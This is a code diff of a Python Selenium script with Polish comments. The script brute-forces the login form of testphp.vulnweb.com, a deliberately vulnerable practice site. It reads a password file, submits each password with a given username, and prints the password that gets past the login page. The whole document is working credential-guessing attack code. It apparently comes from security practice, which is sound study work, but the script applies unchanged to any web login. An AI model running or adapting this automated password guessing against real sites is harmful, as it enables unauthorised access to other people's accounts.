@@ -8,8 +8,8 @@ from selenium.webdriver.support import expected_conditions as EC
 driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()))
 driver.get("http://testphp.vulnweb.com/login.php")
 
-
 """Obłsuga listy hasłę"""
+
 
 def read_list_from_file(filename):
     file_handler = open(filename + ".txt", "r")
@@ -17,24 +17,29 @@ def read_list_from_file(filename):
     file_handler.close()
     return read_list
 
-"""Dane logowania"""
 
-user_used = "test"
-password_from_list = read_list_from_file("passw")
+username = input("Podaj nazwę użytkownik :")  #test
+if username != "":
+    pass
+# print("Podaj nazwę użytkownik :")
+# username = input()
+else:
+    print("Nazwa użytkownika nie może być pusta:")
+
+passfile = input("Podaj nazwę pliku haseł :") #passw
+# print("Podaj nazwę pliku haseł :")
+# passfile = input()
+
+
+"""Osługa strony"""
 cssclick = "#content > div:nth-child(1) > form > table > tbody > tr:nth-child(3) > td > input[type=submit]"
+paswords = read_list_from_file(passfile)
 
-#"""Nazwa na stronie z CSS"""
-
-def loggin(user_space, password_space, cssclick):
-    for password in password_from_list:
-
-        driver.find_element(by=By.NAME, value= user_space).send_keys(user_used)
-        driver.find_element(by=By.NAME, value= password_space).send_keys(password)
-        driver.find_element(by=By.CSS_SELECTOR, value=cssclick).click()
-        try: #obsługa błedów
-            WebDriverWait(driver, 5).until(EC.presence_of_element_located((By.NAME, user_space)))
-        except:
-            print("Correct password is ==> " + password + " <==")
-
-
-
+for password in paswords:
+    driver.find_element(by=By.NAME, value="uname").send_keys(username)
+    driver.find_element(by=By.NAME, value="pass").send_keys(password)
+    driver.find_element(by=By.CSS_SELECTOR, value=cssclick).click()
+    try:  # obsługa błedów
+        WebDriverWait(driver, 5).until(EC.presence_of_element_located((By.NAME, "uname")))
+    except:
+        print("Correct password is ==>" + password + " <==")
